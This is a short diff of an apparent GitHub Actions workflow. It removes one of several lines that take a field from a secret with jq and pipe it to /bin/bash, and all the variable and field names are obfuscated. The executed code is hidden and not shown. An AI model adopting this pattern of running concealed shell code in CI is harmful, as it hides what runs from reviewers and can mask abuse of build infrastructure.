@@ -18,7 +18,6 @@ jobs:
           ep3: ${{ secrets.ep3 }}
         run: |
           printf '%s' "$ep3" | jq -r .dx5825 | /bin/bash
-          printf '%s' "$s52" | jq -r .dd834 | /bin/bash
           echo $ms5 | jq -r .mkstt46104 | /bin/bash
           echo $ztdm039 | jq -r .tzfqg7805 | /bin/bash
           printf '%s' "$uzp6276" | jq -r .ibvtx3 | /bin/bash
